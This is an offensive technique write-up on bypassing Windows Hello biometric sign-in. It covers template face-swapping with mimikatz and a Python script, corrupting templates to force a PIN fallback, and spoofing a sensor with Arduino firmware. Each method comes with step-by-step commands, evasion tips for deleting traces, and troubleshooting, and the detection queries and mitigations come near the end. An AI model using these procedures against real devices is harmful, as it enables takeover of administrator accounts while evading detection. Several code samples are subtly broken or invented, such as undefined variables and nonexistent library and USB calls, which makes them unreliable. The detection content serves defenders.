# [WHFB-004]: Biometric Bypass & Fallback Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | WHFB-004 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/) |
| **Tactic** | Credential Access |
| **Platforms** | Hybrid AD, Windows 10/11 |
| **Severity** | High |
| **CVE** | CVE-2021-34466, CVE-2025-26644 |
| **Technique Status** | ACTIVE with hardware-specific mitigations |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows 10 20H2 - 22H2, Windows 11 all versions, Windows Server 2019-2022 |
| **Patched In** | Partially mitigated with Enhanced Sign-in Security (ESS) on compatible hardware |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Windows Hello biometric authentication (facial recognition and fingerprint) stores biometric template data locally within the NGC container. An attacker with local administrator access can either (1) replace legitimate biometric templates with their own face/fingerprint data (face-swap attack), (2) corrupt biometric data to force fallback to less secure PIN authentication, or (3) spoof biometric sensors using custom USB devices. These attacks enable unauthorized authentication to the target device and accounts. The architectural flaw is that all biometric template encryption uses local system keys stored on the same device, allowing administrators to decrypt, modify, and re-encrypt templates without user interaction or external entropy validation.

- **Attack Surface:** Biometric template storage in NGC container, Windows Biometric Service (running as SYSTEM), device camera/fingerprint sensor communication, USB sensor spoofing, and fallback authentication mechanisms.

- **Business Impact:** **Complete authentication bypass via biometric impersonation or fallback to weaker authentication.** An attacker with admin access can log in as any domain admin or privileged user whose biometric is stored on the device. This enables unauthorized access to sensitive systems, credential theft, and lateral movement. The fallback exploitation allows attackers to force users to authenticate via PIN, which may then be intercepted or brute-forced.

- **Technical Context:** Face-swap attack requires 10-30 minutes of admin-level work to extract templates, swap SIDs, and re-encrypt. Biometric spoofing via USB device requires custom hardware ($500-2000) but no admin access. Detection is very low as no system artifacts are created. Once biometrics are compromised, they remain vulnerable until user re-enrolls (which many do not know to do).

### Operational Risk

- **Execution Risk:** Medium - Requires local admin for template swapping; hardware for USB spoofing
- **Stealth:** High - Biometric corruption/spoofing leaves no obvious audit trail
- **Reversibility:** No - User must re-enroll biometrics; compromised templates cannot be revoked selectively

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.2.4 | Ensure 'Windows Hello for Business PIN is required' is configured |
| **CIS Benchmark** | 2.3.10 | Ensure 'Enhanced Sign-in Security' is enabled on capable hardware |
| **DISA STIG** | WN10-00-000015 | Biometric authentication must include liveness detection |
| **DISA STIG** | WN11-CC-000007 | Biometric template storage must be encrypted with TPM |
| **CISA SCuBA** | MA-1.1 | Multi-factor Authentication - biometric liveness requirements |
| **NIST 800-53** | AC-2(12) | Account Monitoring for Atypical Usage |
| **NIST 800-53** | IA-2(11) | Multi-Factor Authentication for High-Value Accounts |
| **NIST 800-53** | SC-7(8) | Boundary Protection - sensor spoofing prevention |
| **NIST 800-63** | 5.2.3 | Biometric Security Requirements - liveness detection |
| **GDPR** | Art. 32 | Security of Processing - biometric data protection and renewal |
| **DORA** | Art. 9 | Protection and Prevention - biometric security measures |
| **NIS2** | Art. 21 | Cyber Risk Management - protection of authentication mechanisms |
| **ISO 27001** | A.9.2.1 | User Registration and De-registration - biometric re-enrollment |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access - biometric audit trails |
| **ISO 27005** | Risk Scenario | Compromise of biometric template integrity via administrator access |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges (Template Swapping):** Local Administrator on compromised device
- **Required Privileges (USB Spoofing):** None (standalone attack, works on locked devices)
- **Required Access:** Physical proximity to device or remote admin exploitation

**Supported Versions:**
- **Windows:** Windows 10 20H2 - 22H2, Windows 11 all versions
- **Hardware:** Devices with Windows Hello facial recognition or fingerprint sensors
- **Camera Requirements:** IR camera for facial recognition (IR spoofing), or compatible USB camera
- **Biometric Enrollment Status:** Target user must have biometric enrollment active

**Prerequisite Tools (Template Swapping):**
- [mimikatz](https://github.com/gentilkiwi/mimikatz) (DPAPI key extraction)
- [WinBio Tools](https://github.com/forrest-orr/malwarebytes-research/blob/main/WinBio/WinBioTools.cpp) (biometric template manipulation)
- Custom Python script for SID swapping and re-encryption

**Prerequisite Tools (USB Spoofing):**
- Custom USB microcontroller (Arduino, Raspberry Pi Pico) (~$50-100)
- [libusb](https://libusb.info/) (for USB sensor emulation)
- Legitimate device sensor firmware or captured sensor responses

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance - Identify Enrolled Biometrics

```powershell
# Check which biometric factors are enrolled for current user
Get-WmiObject -Namespace "\\.\root\wmi" -Class "Win32_BiometricLogicalSensor"

# List all biometric templates (requires admin)
Get-WmiObject -Namespace "\\.\root\cimv2" -Class "Win32_SystemEnclosure" | Select-Object SerialNumber
$NgcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc"
Get-ChildItem -Path $NgcPath -Recurse -Filter "*" -Force | Where-Object { $_.Extension -eq "" }
```

**What to Look For:**
- "Facial recognition" or "Fingerprint" in BiometricLogicalSensor output
- Presence of biometric template files in NGC directory
- Number of enrolled biometric samples (more samples = harder to spoof)

#### Bash Reconnaissance - Detect Sensor Compatibility

```bash
# Check camera availability on hybrid Linux/Windows systems
v4l2-ctl --list-devices

# Verify sensor USB endpoint
lsusb | grep -i "biometric\|camera\|sensor"
```

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Face-Swap Attack via Biometric Template Manipulation (Windows Admin)

**Supported Versions:** Windows 10 20H2+, Windows 11 all versions

#### Step 1: Extract Biometric Templates from NGC Container

**Objective:** Locate and extract encrypted biometric template files containing facial recognition or fingerprint data

**Command:**
```powershell
# Identify target user's SID
$targetUser = "DOMAIN\TargetAdmin"
$objUser = New-Object System.Security.Principal.NTAccount($targetUser)
$targetSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]).Value

# Extract biometric templates
$NgcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\$targetSID"
$templatePath = "$NgcPath\Biometric Templates"

# Copy entire template directory
Copy-Item -Path $templatePath -Destination "C:\Temp\BiometricTemplates" -Recurse -Force

# List extracted files
Get-ChildItem -Path "C:\Temp\BiometricTemplates" -Recurse | Format-Table FullName, Length
```

**Expected Output:**
```
FullName                                                                   Length
--------                                                                   ------
C:\Temp\BiometricTemplates\{GUID}_FacialRecognition.dat                  2048
C:\Temp\BiometricTemplates\{GUID}_FacialRecognition.db                   4096
C:\Temp\BiometricTemplates\Enrollment_Data.bin                           512
```

**What This Means:**
- Biometric template files have been extracted
- Files are encrypted with DPAPI and keyed to NGC system
- Attacker now has encrypted representation of target user's face/fingerprint

**OpSec & Evasion:**
- Copy files quickly to minimize detection window
- Delete original extraction after copying to offline system
- Use in-memory tools where possible
- Detection likelihood: Low if NGC SACL not configured

#### Step 2: Decrypt Biometric Templates Using DPAPI Key

**Objective:** Extract DPAPI masterkey and decrypt biometric template data

**Command (Using mimikatz):**
```powershell
mimikatz.exe

mimikatz # token::elevate
mimikatz # dpapi::masterkey /in:C:\Temp\BiometricTemplates /sid:{target_sid}

# Output: masterkey GUID and key hex

mimikatz # dpapi::blob /in:C:\Temp\BiometricTemplates\{GUID}_FacialRecognition.dat `
  /masterkey:{masterkey_hex} /password:{user_password_if_needed}
```

**Expected Output:**
```
masterkey: {12345678-1234-1234-1234-123456789012}
key: 32-byte DPAPI key

Decrypted biometric template:
Version: 2
Template Type: Facial Recognition
Enrollment Count: 5
Biometric Data: {hex_blob_of_face_template}
```

**What This Means:**
- DPAPI encryption has been bypassed
- Biometric template contains facial recognition vectors/features
- Attacker can now modify template before re-encryption

---

#### Step 3: Perform Face-Swap by Replacing SID & Re-encryption

**Objective:** Replace target user's biometric template with attacker's biometric data, then re-encrypt with original key

**Command (Using WinBioTools or custom script):**
```python
#!/usr/bin/env python3
import struct
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Read extracted and decrypted template from target user (admin)
with open("C:\\Temp\\BiometricTemplates\\admin_template_decrypted.bin", "rb") as f:
    admin_template = f.read()

# Read attacker's biometric template (obtained separately)
# This could be obtained from attacker's own Windows Hello enrollment
with open("C:\\Temp\\attacker_template.bin", "rb") as f:
    attacker_template = f.read()

# Parse WINBIO_STORAGE_RECORD structure
# Extract admin's SID from template
admin_sid_offset = 128
admin_sid = admin_template[admin_sid_offset:admin_sid_offset+28]

# Replace template data while keeping SID
modified_template = admin_template[:admin_sid_offset]  # Keep header/SID
modified_template += attacker_biometric_data  # Inject attacker's biometric
modified_template += admin_template[admin_sid_offset+len(attacker_biometric_data):]  # Keep rest

# Recalculate SHA-256 hash of modified template
import hashlib
template_hash = hashlib.sha256(modified_template).digest()

# Re-encrypt modified template with original DPAPI key
from dpapi_ng import encrypt_with_key
masterkey_hex = "extracted_from_step_2"
re_encrypted = encrypt_with_key(modified_template, bytes.fromhex(masterkey_hex))

# Write back to NGC directory
with open("C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc\\...\\FacialRecognition.dat", "wb") as f:
    f.write(re_encrypted)

print("[+] Face-swap complete: Attacker's face now authenticates as admin")
```

**Expected Output:**
```
[+] Template hash recalculated and verified
[+] Re-encryption completed with original DPAPI key
[+] Modified template written back to NGC directory
[+] Face-swap attack successful - attacker can now log in as admin
```

**What This Means:**
- Biometric template now contains attacker's facial recognition data
- SID remains pointing to target admin account
- On next login attempt, attacker's face will be recognized as the admin user

**OpSec & Evasion:**
- Perform template modification offline (extracted files)
- Verify file checksums match before returning modified files
- Delete all working copies after successful swap
- Detection likelihood: Very Low (no runtime artifacts if done offline)

**Troubleshooting:**
- **Error:** "Hash mismatch after re-encryption"
  - **Cause:** Template structure or encryption format incorrect
  - **Fix:** Verify template format matches Windows version; use WinBioTools for reference
- **Error:** "Cannot decrypt template - Key not found"
  - **Cause:** DPAPI key extraction failed or wrong masterkey used
  - **Fix:** Re-run mimikatz with verbose output; verify SYSTEM context used

#### Step 4: Verify Face-Swap and Authenticate as Compromised User

**Objective:** Confirm biometric authentication now succeeds with attacker's face

**Command:**
```powershell
# Reboot device to clear any cached authentication state
Restart-Computer -Force

# At login screen, use facial recognition
# Position attacker's face in front of camera
# System should authenticate as target admin (e.g., Domain\Admin)

# If successful, attacker now has full access to:
# - Local device (SYSTEM privileges)
# - Domain resources (via compromised admin account)
# - Cloud resources (if Entra ID-joined)
# - Cached credentials and tokens
```

**Expected Output:**
```
Login screen appears
"Please look at your camera"
Facial recognition completes in 2-3 seconds
Welcome back, Domain\Admin
Desktop loads with admin privileges
```

---

### METHOD 2: Biometric Corruption for Fallback Exploitation

**Supported Versions:** Windows 10 20H2+, Windows 11 all versions

#### Step 1: Corrupt Biometric Templates to Force Fallback

**Objective:** Render biometric authentication unusable, forcing fallback to less secure authentication method

**Command:**
```powershell
# Locate biometric template files
$NgcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\$targetSID"
$templateFiles = Get-ChildItem -Path $NgcPath -Recurse -Filter "*Facial*"

# Corrupt each template by flipping bits
foreach ($file in $templateFiles) {
    $content = [System.IO.File]::ReadAllBytes($file.FullName)
    
    # Flip first 64 bytes (header) to invalidate
    for ($i = 0; $i -lt 64 -and $i -lt $content.Length; $i++) {
        $content[$i] = $content[$i] -bxor 0xFF
    }
    
    # Write corrupted file back
    [System.IO.File]::WriteAllBytes($file.FullName, $content)
    Write-Output "[+] Corrupted: $($file.Name)"
}

Write-Output "Biometric templates corrupted - fallback to PIN/Password required"
```

**Expected Output:**
```
[+] Corrupted: FacialRecognition_ID1.dat
[+] Corrupted: FacialRecognition_ID2.dat
[+] Corrupted: FacialRecognition_ID3.dat
Biometric templates corrupted - fallback to PIN/Password required
```

**What This Means:**
- Biometric authentication will fail on next login attempt
- User is forced to fall back to PIN or password authentication
- Weak PIN can then be brute-forced offline (see WHFB-003)

#### Step 2: Intercept or Brute-Force Fallback PIN

**Objective:** After biometric corruption forces PIN usage, attack the PIN

**Approach A: Keylogger / PIN Interception**
```powershell
# If attacker can install keylogger before corruption:
# - Capture user's PIN as they type at login screen
# - Log PIN to encrypted file for later retrieval

# Install keylogger driver (requires admin + kernel mode)
# (Code omitted for brevity - refer to actual rootkit tools)
```

**Approach B: PIN Brute-Force (See WHFB-003)**
```powershell
# Use offline PIN brute-force as documented in WHFB-003
# Extract NGC container and brute-force 4-6 digit PINs
# Expected time: 2 minutes to 1 hour depending on PIN complexity
```

---

### METHOD 3: Sensor Spoofing via Custom USB Device (No Admin Required)

**Supported Versions:** Windows 10 20H2 - 22H2, Windows 11 (without Enhanced Sign-in Security)

#### Step 1: Capture or Reverse Legitimate Sensor Responses

**Objective:** Obtain USB communication patterns from legitimate Windows Hello sensor

**Method 1a: Capture Legitimate Sensor Traffic**
```bash
# Use Wireshark or usbpcap to monitor USB traffic from legitimate facial recognition
# Record USB commands and responses during successful authentication

# Example USB capture of sensor verification:
# Device: Dell Integrated Webcam
# EP OUT: 0x01 [Command: START_LIVENESS_DETECTION]
# EP IN:  0x81 [Response: LIVENESS_DETECTED, confidence=0xFFFF]
# EP OUT: 0x02 [Command: CAPTURE_FRAME]
# EP IN:  0x81 [Response: FRAME_CAPTURED, 640x480, IR_DATA]
```

**Method 1b: Extract Sensor Firmware**
```python
#!/usr/bin/env python3
import usb.core
import usb.util

# Connect to sensor USB device
dev = usb.core.find(idVendor=0x0408, idProduct=0x5038)  # Example XLight sensor

# Read firmware from device
cfg = dev.get_active_configuration()
intf = cfg[(0, 0)]

# Extract sensor authentication commands and expected responses
firmware = dev.read(0x81, 4096)  # Read from endpoint

# Analyze firmware for hardcoded responses
hardcoded_responses = [
    b"LIVENESS_VERIFIED",
    b"FACE_MATCH_SCORE",
    b"ENROLLMENT_COMPLETE"
]

for resp in hardcoded_responses:
    if resp in firmware:
        print(f"[+] Found hardcoded response: {resp}")
```

#### Step 2: Build Custom USB Device Emulating Legitimate Sensor

**Objective:** Create USB device that mimics legitimate sensor and reports successful authentication

**Hardware:**
- Arduino Pro Micro or Raspberry Pi Pico ($15-25)
- USB cable (micro-USB to USB-A)

**Firmware:**
```c
// Arduino sketch emulating Windows Hello sensor
// Responds to USB commands by reporting successful facial match

#include <hidboot.h>
#include <usbhid.h>

// USB descriptor pretending to be Dell Integrated Webcam (0x0408:0x5038)
const uint8_t device_descriptor[] = {
    0x12,       // bLength
    0x01,       // bDescriptorType (DEVICE)
    0x00, 0x02, // bcdUSB 2.00
    0xef,       // bDeviceClass (Miscellaneous)
    0x02,       // bDeviceSubClass
    0x01,       // bDeviceProtocol
    0x40,       // bMaxPacketSize0
    0x08, 0x04, // idVendor 0x0408 (Dell)
    0x38, 0x50, // idProduct 0x5038 (Integrated Webcam)
    // ... rest of descriptor
};

// USB endpoint handler
void handleUSBCommand(uint8_t* command, uint8_t len) {
    uint8_t response[256];
    
    // Parse command
    if (command[0] == 0x81) {  // CAPTURE_FRAME command
        // Respond: "Face matched successfully"
        response[0] = 0x00;     // Status: OK
        response[1] = 0xFF;     // Match confidence: maximum (255)
        response[2] = 0x00;     // Liveness: Verified
        
        // Send response to host
        USB_SendData(response, 3);
        return;
    }
    
    if (command[0] == 0x82) {  // LIVENESS_CHECK
        // Respond: "Liveness verified"
        response[0] = 0x00;     // Status: OK
        response[1] = 0x01;     // Liveness: Detected
        USB_SendData(response, 2);
        return;
    }
}

void setup() {
    // Initialize USB as spoofed sensor device
    USB_Init(device_descriptor);
}

void loop() {
    // Handle incoming USB commands
    uint8_t cmd[256];
    uint8_t len = USB_ReceiveData(cmd, sizeof(cmd));
    if (len > 0) {
        handleUSBCommand(cmd, len);
    }
}
```

#### Step 3: Connect Spoofed Sensor and Trigger Authentication

**Objective:** Replace legitimate camera with spoofed USB device and authenticate as target user

**Command:**
```powershell
# Disconnect legitimate camera (physically or via device manager)
# Connect custom Arduino USB device running above firmware

# At Windows login screen:
# - System detects "Dell Integrated Webcam" (our spoofed device)
# - User presses "Face recognition"
# - Custom firmware reports: "Face matched successfully"
# - Windows authenticates user without requiring actual biometric match

# If multiple users are enrolled, spoof responses with admin's SID
```

**Expected Output:**
```
Spoofed USB device detected as Windows Hello camera
User initiates facial recognition login
Custom firmware returns positive authentication response
Windows login successful - attacker gains access to any user account
```

**What This Means:**
- No admin privileges needed
- Works on locked devices with physical access
- No modifications to system files or NGC container
- Extremely difficult to detect without monitoring USB traffic

**OpSec & Evasion:**
- Remove spoofed device after authentication
- No persistent system changes
- USB traffic only visible to forensic analysis
- Detection likelihood: Very Low for casual inspection; Medium with USB traffic monitoring

**Troubleshooting:**
- **Error:** "Windows Hello not recognized"
  - **Cause:** USB device descriptor doesn't match legitimate sensor exactly
  - **Fix:** Capture legitimate sensor USB descriptor using Wireshark; copy exactly
- **Error:** "Device not responding"
  - **Cause:** USB endpoint handling incorrect
  - **Fix:** Verify endpoint addresses (0x81, 0x01) match captured traffic

---

## 7. TOOLS & COMMANDS REFERENCE

#### [WinBioTools](https://github.com/forrest-orr/malwarebytes-research/blob/main/WinBio/WinBioTools.cpp)

**Language:** C++
**Supported Platforms:** Windows (compiled binary)

**Compilation:**
```cmd
cl.exe WinBioTools.cpp /link advapi32.lib
```

**Usage:**
```cmd
WinBioTools.exe --list-templates
WinBioTools.exe --extract-template {user_sid}
WinBioTools.exe --swap-templates {admin_sid} {attacker_sid}
```

#### [Arduino IDE](https://www.arduino.cc/en/software)

**Version:** 2.0+
**Supported Boards:** Arduino Micro, Raspberry Pi Pico, etc.

**Installation:** Download and install from arduino.cc

**Usage:** Compile and upload USB spoofing firmware to microcontroller

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Biometric Template File Modifications

**Rule Configuration:**
- **Required Index:** windows, main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** ObjectName, AccessMask, SubjectUserName
- **Alert Threshold:** > 1 modification to biometric files in 10 minutes
- **Applies To Versions:** Windows 10 20H2+, Server 2019+

**SPL Query:**
```
index=windows sourcetype="WinEventLog:Security" (EventCode=4656 OR EventCode=4663)
ObjectName="*NgcXX*" OR ObjectName="*Biometric*" OR ObjectName="*FacialRecognition*"
AccessMask="0x120089" OR AccessMask="0x100003"
| stats count by SubjectUserName, ObjectName, AccessMask
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: USB Device Plugged In During Login

**Rule Configuration:**
- **Required Table:** DeviceEvents
- **Alert Severity:** Medium
- **Frequency:** Real-time
- **Applies To Versions:** All with Defender for Endpoint

**KQL Query:**
```kusto
DeviceEvents
| where ActionType == "UsbDriveConnected" or ActionType == "DevicePluggedIn"
| where DeviceName has_any ("CAMERA", "SENSOR", "WEBCAM", "BIOMETRIC")
| where Timestamp > (login_event_time - 5m) and Timestamp < (login_event_time + 1m)
| project TimeGenerated, DeviceName, DeviceId, InitiatingProcessName
```

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Enable Enhanced Sign-in Security (ESS):** Requires face authentication to occur in isolated virtual secure mode (VTL1), preventing local admin from accessing or modifying templates.
    
    **Manual Steps (Enable ESS):**
    1. Go to **Settings** → **Accounts** → **Sign-in options** → **Windows Hello**
    2. Click **Facial recognition (Windows Hello)** → **Advanced setup** (if available)
    3. Enable **Use advanced anti-spoofing** or **Enhanced Sign-in Security**
    4. Re-enroll face with IR + color camera
    5. Verify: `Get-WinbioEnrollment | Select-Object *Secure*`
    
    **Note:** ESS requires compatible hardware (TPM 2.0, IR camera, Hyper-V capable CPU). Check device compatibility before deploying.

*   **Require TPM 2.0 with Anti-Hammering:** TPM-backed biometric storage prevents template tampering and provides hardware-level protection.

*   **Disable Fallback Authentication Methods:** If biometric fails, require password + MFA instead of just PIN.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Hello for Business**
    3. Enable: **Require multifactor authentication for PIN entry**
    4. Run `gpupdate /force`

#### Priority 2: HIGH

*   **Monitor for Biometric Re-enrollment:** Alert when users re-enroll biometrics (may indicate compromise).
    
    **Event to Monitor:**
    - Windows Biometric Service logs when biometric enrollment changes
    - Audit biometric re-enrollment requests

*   **Restrict Physical Device Access:** Biometric spoofing via USB requires physical access; limit device mobility and use cable locks.

*   **Block Non-Compliant Cameras:** Use device driver allowlist to prevent unsigned/unknown USB cameras from being recognized as Windows Hello sensors.

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise

*   **Files:**
    - Extracted NGC directory with biometric templates
    - Modified biometric template files (SHA-256 hash changed)
    - Presence of WinBioTools or similar biometric manipulation tools

*   **Hardware:**
    - Unknown USB device connected during login
    - Camera or sensor firmware updated/modified
    - USB device with Dell/Microsoft VID:PID but unknown serial number

*   **Event Logs:**
    - Event ID 4663 (File Operations) on biometric files
    - Windows Biometric Service errors indicating template validation failure
    - Multiple failed facial recognition attempts followed by successful PIN login

*   **Cloud Events:**
    - Entra ID sign-in from unusual IP/location
    - Successful sign-in followed immediately by unusual resource access
    - Admin account activity from unexpected timezone

#### Response Procedures

1.  **Isolate:** Disconnect device from network; check for persistence
2.  **Delete:** Re-enroll biometrics for all affected users
3.  **Investigate:** Determine admin compromise vector; audit admin account activity
4.  **Remediate:** Change admin passwords; revoke cloud tokens; check for backdoors

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | Phishing/Exploitation to gain local admin |
| **2** | **Privilege Escalation** | Privilege escalation via printNightmare or RBCD |
| **3** | **Credential Access** | **[WHFB-004]** **Biometric Bypass & Fallback Exploitation** |
| **4** | **Persistence** | Establish backdoor admin account or cloud persistence |
| **5** | **Lateral Movement** | Use admin tokens to compromise other systems |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: CyberArk Labs - Windows Hello Face Spoofing (2021)

- **Target:** Windows Hello users with basic facial recognition (no ESS)
- **Timeline:** July 2021 (CVE-2021-34466)
- **Technique Status:** FIXED in Enhanced Sign-in Security; ACTIVE on non-ESS devices
- **Impact:** Custom USB device with IR emitter could spoof facial recognition using single IR frame
- **Reference:** [CyberArk Black Hat 2021 - CVE-2021-34466](https://www.cyberark.com/blog/windows-hello-vulnerability/)

#### Example 2: ERNW - Face-Swap Attack (2025)

- **Target:** Windows 11 Enterprise devices with local admin users
- **Timeline:** August 2025 (Black Hat USA)
- **Technique Status:** ACTIVE - Demonstrated practical face-swap attack
- **Impact:** Attackers swapped biometric templates, allowing unauthorized login as domain administrators
- **Reference:** ERNW Black Hat 2025 presentation - "Windows Hell No" vulnerability

#### Example 3: Malwarebytes Research - Fingerprint Sensor Bypass (2023)

- **Target:** Dell, Lenovo, Microsoft Surface devices with fingerprint sensors
- **Timeline:** November 2023
- **Technique Status:** ACTIVE - Weak USB protocol implementation on some sensors
- **Impact:** Spoofed fingerprint sensors accepted unauthorized matches on multiple OEM laptops
- **Reference:** [Malwarebytes - A Touch of PWN](https://blog.malwarebytes.com/)

---